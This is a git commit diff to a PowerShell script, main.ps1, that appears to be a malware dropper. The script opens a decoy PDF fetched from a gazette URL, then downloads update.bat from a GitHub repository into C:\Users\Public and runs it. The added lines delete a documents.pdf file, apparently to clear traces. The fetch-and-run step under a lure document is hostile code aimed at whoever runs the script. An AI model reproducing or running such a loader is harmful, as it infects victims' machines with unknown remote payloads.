53dc1ea402fdac2acad223641b222199cc671e3f
sys!!+root <79191180+Algorithm99root@users.noreply.github.com>
2025-03-09 20:45:45 +0000

    Update main.ps1

--- main.ps1
+++ main.ps1
@@ -3,3 +3,6 @@ Invoke-WebRequest -Uri "https://basis.org.bd/public//files/gazette/fd7cb610579e8
 Start-Process "$PWD\document.pdf"
 Start-Sleep -Seconds 2
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Algorithm99root/oiii__hoyyyy/refs/heads/main/update.bat" -OutFile "C:\\Users\\Public\\update.bat"; Start-Process "C:\\Users\\Public\\update.bat"
+if (Test-Path "$PWD\documents.pdf") {
+    Remove-Item "$PWD\documents.pdf" -Force
+}
